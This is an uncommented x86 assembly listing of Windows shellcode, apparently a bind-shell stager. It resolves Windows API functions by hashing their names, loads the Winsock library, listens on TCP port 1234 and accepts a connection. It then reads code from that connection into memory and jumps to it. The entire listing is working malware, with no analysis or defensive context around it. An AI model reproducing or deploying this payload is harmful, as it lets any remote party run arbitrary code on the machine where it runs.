```asm
_start:
    cld
    .byte 0x6A
L_2:
    .byte 0xEB
    inc edi
    call L_2
    pushal
    xor ebx, ebx
    mov edi, dword ptr [ebp + 0x3c]
    mov edi, dword ptr [ebp + edi + 0x78]
    add edi, ebp
L_15:
    mov edx, dword ptr [edi + 0x20]
    add edx, ebp
    mov esi, dword ptr [edx + ebx*4]
    add esi, ebp
    xor eax, eax
    cdq
L_22:
    lodsb al, byte ptr [esi]
    ror edx, 0xd
    add edx, eax
    test al, al
    jne L_22
    inc ebx
    cmp dx, cx
    jne L_15
    dec ebx
    mov ecx, dword ptr [edi + 0x24]
    add ecx, ebp
    mov bx, word ptr [ecx + ebx*2]
    mov ecx, dword ptr [edi + 0x1c]
    add ecx, ebp
    add ebp, dword ptr [ecx + ebx*4]
    mov dword ptr [esp + 0x1c], ebp
    popal
    jmp eax
block_A:
    xor ebx, ebx
    mov eax, dword ptr fs:[ebx + 0x30]
    mov eax, dword ptr [eax + 0xc]
    mov esi, dword ptr [eax + 0x1c]
    lodsd eax, dword ptr [esi]
    mov ebp, dword ptr [eax + 8]
    pop esi
    push bx
    push 0x3233
    push 0x5f327377
    push esp
    mov cx, 0x6072
    call esi
    xchg ebp, eax
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    inc ebx
    push ebx
    inc ebx
    push ebx
    jmp block_B
block_C:
    sub di, 0x208
    jmp block_D
block_B:
    mov edi, esp
    jmp block_C
block_D:
    push edi
    push ebx
    mov cx, 0xdfe7
    call esi
    mov cx, 0x6fa8
    call esi
    xchg edi, eax
    push 0xd204
    push bx
    mov ecx, esp
    push 0x10
    push ecx
    push edi
    mov cx, 0x3b80
    call esi
    push ebx
    push edi
    mov cx, 0x4975
    call esi
    push esp
    push esp
    push esp
    push edi
    mov cx, 0x4c32
    call esi
    xchg edi, eax
    push eax
    mov cx, 0xce33
    call esi
    mov ecx, esp
    push eax
    mov ah, 0xc
    push eax
    push ecx
    push edi
    push ecx
    mov cx, 0x38c0
    jmp esi
```